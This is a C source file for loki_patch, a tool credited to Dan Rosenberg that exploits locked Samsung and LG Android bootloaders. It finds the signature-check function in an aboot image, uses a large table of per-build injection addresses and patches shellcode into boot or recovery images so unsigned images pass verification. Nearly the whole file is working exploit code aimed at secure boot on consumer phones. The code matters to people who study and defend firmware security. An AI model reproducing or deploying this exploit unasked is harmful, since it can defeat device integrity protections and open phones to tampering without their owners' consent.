/*
 * loki_patch
 *
 * A utility to patch unsigned boot and recovery images to make
 * them suitable for booting on the AT&T/Verizon Samsung
 * Galaxy S4, Galaxy Stellar, and various locked LG devices
 *
 * by Dan Rosenberg (@djrbliss)
 *
 */

#include <stdio.h>
#include <stdbool.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include "loki.h"

struct target {
	char *vendor;
	char *device;
	char *build;
	unsigned long injection_address;
	unsigned long hdr;
	bool use_original_page_size;
};

struct target targets[] = {
	{
		.vendor = "AT&T",
		.device = "Samsung Galaxy S4",
		.build = "JDQ39.I337UCUAMDB or JDQ39.I337UCUAMDL",
		.injection_address = 0x88e0ff98,
		.hdr = 0x88f3bafc,
		.use_original_page_size = false,
	},
	{
		.vendor = "Verizon",
		.device = "Samsung Galaxy S4",
		.build = "JDQ39.I545VRUAMDK",
		.injection_address = 0x88e0fe98,
		.hdr = 0x88f372fc,
		.use_original_page_size = false,
	},
	{
		.vendor = "DoCoMo",
		.device = "Samsung Galaxy S4",
		.build = "JDQ39.SC04EOMUAMDI",
		.injection_address = 0x88e0fcd8,
		.hdr = 0x88f0b2fc,
		.use_original_page_size = false,
	},
	{
		.vendor = "Verizon",
		.device = "Samsung Galaxy Stellar",
		.build = "IMM76D.I200VRALH2",
		.injection_address = 0x88e0f5c0,
		.hdr = 0x88ed32e0,
		.use_original_page_size = false,
	},
	{
		.vendor = "Verizon",
		.device = "Samsung Galaxy Stellar",
		.build = "JZO54K.I200VRBMA1",
		.injection_address = 0x88e101ac,
		.hdr = 0x88ed72e0,
		.use_original_page_size = false,
	},
	{
		.vendor = "T-Mobile",
		.device = "LG Optimus F3Q",
		.build = "D52010c",
		.injection_address = 0x88f1079c,
		.hdr = 0x88f64508,
		.use_original_page_size = 1,
	},
	{
		.vendor = "DoCoMo",
		.device = "LG Optimus G",
		.build = "L01E20b",
		.injection_address = 0x88F10E48,
		.hdr = 0x88F54418,
		.use_original_page_size = true,
	},
	{
		.vendor = "DoCoMo",
		.device = "LG Optimus G Pro",
		.build = "L04E10f",
		.injection_address = 0x88f1102c,
		.hdr = 0x88f54418,
		.use_original_page_size = true,
	},
	{
		.vendor = "AT&T or HK",
		.device = "LG Optimus G Pro",
		.build = "E98010g or E98810b",
		.injection_address = 0x88f11084,
		.hdr = 0x88f54418,
		.use_original_page_size = true,
	},
	{
		.vendor = "KT, LGU, or SKT",
		.device = "LG Optimus G Pro",
		.build = "F240K10o, F240L10v, or F240S10w",
		.injection_address = 0x88f110b8,
		.hdr = 0x88f54418,
		.use_original_page_size = true,
	},
	{
		.vendor = "KT, LGU, or SKT",
		.device = "LG Optimus LTE 2",
		.build = "F160K20g, F160L20f, F160LV20d, or F160S20f",
		.injection_address = 0x88f10864,
		.hdr = 0x88f802b8,
		.use_original_page_size = true,
	},
	{
		.vendor = "MetroPCS",
		.device = "LG Spirit",
		.build = "MS87010a_05",
		.injection_address = 0x88f0e634,
		.hdr = 0x88f68194,
		.use_original_page_size = true,
	},
	{
		.vendor = "MetroPCS",
		.device = "LG Motion",
		.build = "MS77010f_01",
		.injection_address = 0x88f1015c,
		.hdr = 0x88f58194,
		.use_original_page_size = true,
	},
	{
		.vendor = "Verizon",
		.device = "LG Lucid 2",
		.build = "VS87010B_12",
		.injection_address = 0x88f10adc,
		.hdr = 0x88f702bc,
		.use_original_page_size = true,
	},
	{
		.vendor = "Verizon",
		.device = "LG Spectrum 2",
		.build = "VS93021B_05",
		.injection_address = 0x88f10c10,
		.hdr = 0x88f84514,
		.use_original_page_size = true,
	},
	{
		.vendor = "Boost Mobile",
		.device = "LG Optimus F7",
		.build = "LG870ZV4_06",
		.injection_address = 0x88f11714,
		.hdr = 0x88f842ac,
		.use_original_page_size = true,
	},
	{
		.vendor = "US Cellular",
		.device = "LG Optimus F7",
		.build = "US78011a",
		.injection_address = 0x88f112c8,
		.hdr = 0x88f84518,
		.use_original_page_size = true,
	},
	{
		.vendor = "Sprint",
		.device = "LG Optimus F7",
		.build = "LG870ZV5_02",
		.injection_address = 0x88f11710,
		.hdr = 0x88f842a8,
		.use_original_page_size = true,
	},
	{
		.vendor = "Virgin Mobile",
		.device = "LG Optimus F3",
		.build = "LS720ZV5",
		.injection_address = 0x88f108f0,
		.hdr = 0x88f854f4,
		.use_original_page_size = true,
	},
	{
		.vendor = "T-Mobile and MetroPCS",
		.device = "LG Optimus F3",
		.build = "LS720ZV5",
		.injection_address = 0x88f10264,
		.hdr = 0x88f64508,
		.use_original_page_size = true,
	},
	{
		.vendor = "AT&T",
		.device = "LG G2",
		.build = "D80010d",
		.injection_address = 0xf8132ac,
		.hdr = 0xf906440,
		.use_original_page_size = true,
	},
	{
		.vendor = "Verizon",
		.device = "LG G2",
		.build = "VS98010b",
		.injection_address = 0xf8131f0,
		.hdr = 0xf906440,
		.use_original_page_size = true,
	},
	{
		.vendor = "AT&T",
		.device = "LG G2",
		.build = "D80010o",
		.injection_address = 0xf813428,
		.hdr = 0xf904400,
		.use_original_page_size = true,
	},
	{
		.vendor = "Verizon",
		.device = "LG G2",
		.build = "VS98012b",
		.injection_address = 0xf813210,
		.hdr = 0xf906440,
		.use_original_page_size = true,
	},
	{
		.vendor = "T-Mobile or Canada",
		.device = "LG G2",
		.build = "D80110c or D803",
		.injection_address = 0xf813294,
		.hdr = 0xf906440,
		.use_original_page_size = true,
	},
	{
		.vendor = "International",
		.device = "LG G2",
		.build = "D802b",
		.injection_address = 0xf813a70,
		.hdr = 0xf9041c0,
		.use_original_page_size = true,
	},
	{
		.vendor = "Sprint",
		.device = "LG G2",
		.build = "LS980ZV7",
		.injection_address = 0xf813460,
		.hdr = 0xf9041c0,
		.use_original_page_size = true,
	},
	{
		.vendor = "KT or LGU",
		.device = "LG G2",
		.build = "F320K, F320L",
		.injection_address = 0xf81346c,
		.hdr = 0xf8de440,
		.use_original_page_size = true,
	},
	{
		.vendor = "SKT",
		.device = "LG G2",
		.build = "F320S",
		.injection_address = 0xf8132e4,
		.hdr = 0xf8ee440,
		.use_original_page_size = true,
	},
	{
		.vendor = "SKT",
		.device = "LG G2",
		.build = "F320S11c",
		.injection_address = 0xf813470,
		.hdr = 0xf8de440,
		.use_original_page_size = true,
	},
	{
		.vendor = "DoCoMo",
		.device = "LG G2",
		.build = "L-01F",
		.injection_address = 0xf813538,
		.hdr = 0xf8d41c0,
		.use_original_page_size = true,
	},
	{
		.vendor = "KT",
		.device = "LG G Flex",
		.build = "F340K",
		.injection_address = 0xf8124a4,
		.hdr = 0xf8b6440,
		.use_original_page_size = true,
	},
	{
		.vendor = "KDDI",
		.device = "LG G Flex",
		.build = "LGL2310d",
		.injection_address = 0xf81261c,
		.hdr = 0xf8b41c0,
		.use_original_page_size = true,
	},
	{
		.vendor = "International",
		.device = "LG Optimus F5",
		.build = "P87510e",
		.injection_address = 0x88f10a9c,
		.hdr = 0x88f702b8,
		.use_original_page_size = true,
	},
	{
		.vendor = "SKT",
		.device = "LG Optimus LTE 3",
		.build = "F260S10l",
		.injection_address = 0x88f11398,
		.hdr = 0x88f8451c,
		.use_original_page_size = true,
	},
	{
		.vendor = "International",
		.device = "LG G Pad 8.3",
		.build = "V50010a",
		.injection_address = 0x88f10814,
		.hdr = 0x88f801b8,
		.use_original_page_size = true,
	},
	{
		.vendor = "International",
		.device = "LG G Pad 8.3",
		.build = "V50010c or V50010e",
		.injection_address = 0x88f108bc,
		.hdr = 0x88f801b8,
		.use_original_page_size = true,
	},
	{
		.vendor = "Verizon",
		.device = "LG G Pad 8.3",
		.build = "VK81010c",
		.injection_address = 0x88f11080,
		.hdr = 0x88fd81b8,
		.use_original_page_size = true,
	},
	{
		.vendor = "International",
		.device = "LG Optimus L9 II",
		.build = "D60510a",
		.injection_address = 0x88f10d98,
		.hdr = 0x88f84aa4,
		.use_original_page_size = true,
	},
	{
		.vendor = "MetroPCS",
		.device = "LG Optimus F6",
		.build = "MS50010e",
		.injection_address = 0x88f10260,
		.hdr = 0x88f70508,
		.use_original_page_size = true,
	},
	{
		.vendor = "Open EU",
		.device = "LG Optimus F6",
		.build = "D50510a",
		.injection_address = 0x88f10284,
		.hdr = 0x88f70aa4,
		.use_original_page_size = true,
	},
	{
		.vendor = "KDDI",
		.device = "LG Isai",
		.build = "LGL22",
		.injection_address = 0xf813458,
		.hdr = 0xf8d41c0,
		.use_original_page_size = true,
	},
	{
		.vendor = "KDDI",
		.device = "LG",
		.build = "LGL21",
		.injection_address = 0x88f10218,
		.hdr = 0x88f50198,
		.use_original_page_size = 1,
	},
	{
		.vendor = "KT",
		.device = "LG Optimus GK",
		.build = "F220K",
		.injection_address = 0x88f11034,
		.hdr = 0x88f54418,
		.use_original_page_size = true,
	},
	{
		.vendor = "International",
		.device = "LG Vu 3",
		.build = "F300L",
		.injection_address = 0xf813170,
		.hdr = 0xf8d2440,
		.use_original_page_size = true,
	},
	{
		.vendor = "Sprint",
		.device = "LG Viper",
		.build = "LS840ZVK",
		.injection_address = 0x4010fe18,
		.hdr = 0x40194198,
		.use_original_page_size = true,
	},
	{
		.vendor = "International",
		.device = "LG G Flex",
		.build = "D95510a",
		.injection_address = 0xf812490,
		.hdr = 0xf8c2440,
		.use_original_page_size = true,
	},
	{
		.vendor = "Softbank",
		.device = "DIGNO R 202K",
		.build = "101.0.2c10",
		.injection_address = 0x88f00414,
		.hdr = 0x88f581a4,
		.use_original_page_size = true,
	},
	{
		.vendor = "Disney Mobile on SoftBank",
		.device = "DM015K",
		.build = "100.1.1600",
		.injection_address = 0x88f00414,
		.hdr = 0x88f581a4,
		.use_original_page_size = true,
	},
	{
		.vendor = "Softbank",
		.device = "HONEY BEE 201K",
		.build = "117.1.1c00",
		.injection_address = 0x88f00378,
		.hdr = 0x88f581a4,
		.use_original_page_size = true,
	},
	{
		.vendor = "Sprint",
		.device = "LG Mach",
		.build = "LS860ZV7",
		.injection_address = 0x88f102b4,
		.hdr = 0x88f6c194,
		.use_original_page_size = 1,
	},
};

static unsigned char patch[] = PATCH;

int patch_shellcode(unsigned int header, unsigned int ramdisk)
{

	unsigned int i;
	int found_header, found_ramdisk;
	unsigned int *ptr;

	found_header = 0;
	found_ramdisk = 0;

	for (i = 0; i < sizeof(patch); i++) {
		ptr = (unsigned int *)&patch[i];
		if (*ptr == 0xffffffff) {
			*ptr = header;
			found_header = 1;
		}

		if (*ptr == 0xeeeeeeee) {
			*ptr = ramdisk;
			found_ramdisk = 1;
		}
	}

	if (found_header && found_ramdisk)
		return 0;

	return -1;
}

int loki_patch(const char* partition_label, const char* aboot_image, const char* in_image, const char* out_image)
{
	int ifd, ofd, aboot_fd, pos, i, recovery, offset, fake_size;
	unsigned int orig_ramdisk_size, orig_kernel_size, page_kernel_size, page_ramdisk_size, page_size, page_mask;
	unsigned long target, aboot_base;
	void *orig, *aboot, *ptr;
	struct target *tgt;
	struct stat st;
	struct boot_img_hdr *hdr;
	struct loki_hdr *loki_hdr;
	char *buf;

	if (!strcmp(partition_label, "boot")) {
		recovery = 0;
	} else if (!strcmp(partition_label, "recovery")) {
		recovery = 1;
	} else {
		printf("[+] First argument must be \"boot\" or \"recovery\".\n");
		return 1;
	}

	/* Open input files */
	aboot_fd = open(aboot_image, O_RDONLY);
	if (aboot_fd < 0) {
		printf("[-] Failed to open %s for reading.\n", aboot_image);
		return 1;
	}

	ifd = open(in_image, O_RDONLY);
	if (ifd < 0) {
		printf("[-] Failed to open %s for reading.\n", in_image);
		return 1;
	}

	ofd = open(out_image, O_WRONLY|O_CREAT|O_TRUNC, 0644);
	if (ofd < 0) {
		printf("[-] Failed to open %s for writing.\n", out_image);
		return 1;
	}

	/* Find the signature checking function via pattern matching */
	if (fstat(aboot_fd, &st)) {
		printf("[-] fstat() failed.\n");
		return 1;
	}

	aboot = mmap(0, (st.st_size + 0xfff) & ~0xfff, PROT_READ, MAP_PRIVATE, aboot_fd, 0);
	if (aboot == MAP_FAILED) {
		printf("[-] Failed to mmap aboot.\n");
		return 1;
	}

	target = 0;
	aboot_base = *(unsigned int *)(aboot + 12) - 0x28;

	for (ptr = aboot; ptr < aboot + st.st_size - 0x1000; ptr++) {
		for (i = 0; i < sizeof(opcodes) / sizeof(opcodes[0]); i++) {
			if (!memcmp(ptr, opcodes[i], strlen(opcodes[i]))) {
				target = (unsigned long)ptr - (unsigned long)aboot + aboot_base;
				break;
			}
		}
	}

	/* Do a second pass for the second LG pattern. This is necessary because
	 * apparently some LG models have both LG patterns, which throws off the
	 * fingerprinting. */

	if (!target) {
		for (ptr = aboot; ptr < aboot + st.st_size - 0x1000; ptr++) {
			if (!memcmp(ptr, PATTERN, 8)) {

				target = (unsigned long)ptr - (unsigned long)aboot + aboot_base;
				break;
			}
		}
	}

	if (!target) {
		printf("[-] Failed to find function to patch.\n");
		return 1;
	}

	tgt = NULL;

	for (i = 0; i < (sizeof(targets)/sizeof(targets[0])); i++) {
		if (targets[i].injection_address == target) {
			tgt = &targets[i];
			break;
		}
	}

	if (!tgt) {
		printf("[-] Unsupported aboot image.\n");
		return 1;
	}

	printf("[+] Detected target %s %s build %s\n", tgt->vendor, tgt->device, tgt->build);

	/* Map the original boot/recovery image */
	if (fstat(ifd, &st)) {
		printf("[-] fstat() failed.\n");
		return 1;
	}

	orig = mmap(0, (st.st_size + 0x2000 + 0xfff) & ~0xfff, PROT_READ|PROT_WRITE, MAP_PRIVATE, ifd, 0);
	if (orig == MAP_FAILED) {
		printf("[-] Failed to mmap input file.\n");
		return 1;
	}

	hdr = orig;
	loki_hdr = orig + 0x400;

	if (!memcmp(loki_hdr->magic, "LOKI", 4)) {
		printf("[-] Input file is already a Loki image.\n");

		/* Copy the entire file to the output transparently */
		if (write(ofd, orig, st.st_size) != st.st_size) {
			printf("[-] Failed to copy Loki image.\n");
			return 1;
		}

		printf("[+] Copied Loki image to %s.\n", out_image);

		return 0;
	}

	/* Set the Loki header */
	memcpy(loki_hdr->magic, "LOKI", 4);
	loki_hdr->recovery = recovery;
	strncpy(loki_hdr->build, tgt->build, sizeof(loki_hdr->build) - 1);

	page_size = hdr->page_size;
	page_mask = hdr->page_size - 1;

	orig_kernel_size = hdr->kernel_size;
	orig_ramdisk_size = hdr->ramdisk_size;

	printf("[+] Original kernel address: %.08x\n", hdr->kernel_addr);
	printf("[+] Original ramdisk address: %.08x\n", hdr->ramdisk_addr);

	/* Store the original values in unused fields of the header */
	loki_hdr->orig_kernel_size = orig_kernel_size;
	loki_hdr->orig_ramdisk_size = orig_ramdisk_size;
	loki_hdr->ramdisk_addr = hdr->kernel_addr + ((hdr->kernel_size + page_mask) & ~page_mask);

	if (patch_shellcode(tgt->hdr, hdr->ramdisk_addr) < 0) {
		printf("[-] Failed to patch shellcode.\n");
		return 1;
	}

	/* Ramdisk must be aligned to a page boundary */
	hdr->kernel_size = ((hdr->kernel_size + page_mask) & ~page_mask) + hdr->ramdisk_size;

	/* Guarantee 16-byte alignment */
	offset = tgt->injection_address & 0xf;

	hdr->ramdisk_addr = tgt->injection_address - offset;

	if (tgt->use_original_page_size) {
		fake_size = page_size;
		hdr->ramdisk_size = page_size;
	}
	else {
		fake_size = 0x200;
		hdr->ramdisk_size = 0;
	}

	/* Write the image header */
	if (write(ofd, orig, page_size) != page_size) {
		printf("[-] Failed to write header to output file.\n");
		return 1;
	}

	page_kernel_size = (orig_kernel_size + page_mask) & ~page_mask;

	/* Write the kernel */
	if (write(ofd, orig + page_size, page_kernel_size) != page_kernel_size) {
		printf("[-] Failed to write kernel to output file.\n");
		return 1;
	}

	page_ramdisk_size = (orig_ramdisk_size + page_mask) & ~page_mask;

	/* Write the ramdisk */
	if (write(ofd, orig + page_size + page_kernel_size, page_ramdisk_size) != page_ramdisk_size) {
		printf("[-] Failed to write ramdisk to output file.\n");
		return 1;
	}

	/* Write fake_size bytes of original code to the output */
	buf = malloc(fake_size);
	if (!buf) {
		printf("[-] Out of memory.\n");
		return 1;
	}

	lseek(aboot_fd, tgt->injection_address - aboot_base - offset, SEEK_SET);
	read(aboot_fd, buf, fake_size);

	if (write(ofd, buf, fake_size) != fake_size) {
		printf("[-] Failed to write original aboot code to output file.\n");
		return 1;
	}

	/* Save this position for later */
	pos = lseek(ofd, 0, SEEK_CUR);

	/* Write the device tree if needed */
	if (hdr->dt_size) {

		printf("[+] Writing device tree.\n");

		if (write(ofd, orig + page_size + page_kernel_size + page_ramdisk_size, hdr->dt_size) != hdr->dt_size) {
			printf("[-] Failed to write device tree to output file.\n");
			return 1;
		}
	}

	lseek(ofd, pos - (fake_size - offset), SEEK_SET);

	/* Write the patch */
	if (write(ofd, patch, sizeof(patch)) != sizeof(patch)) {
		printf("[-] Failed to write patch to output file.\n");
		return 1;
	}

	close(ifd);
	close(ofd);
	close(aboot_fd);

	printf("[+] Output file written to %s\n", out_image);

	return 0;
}
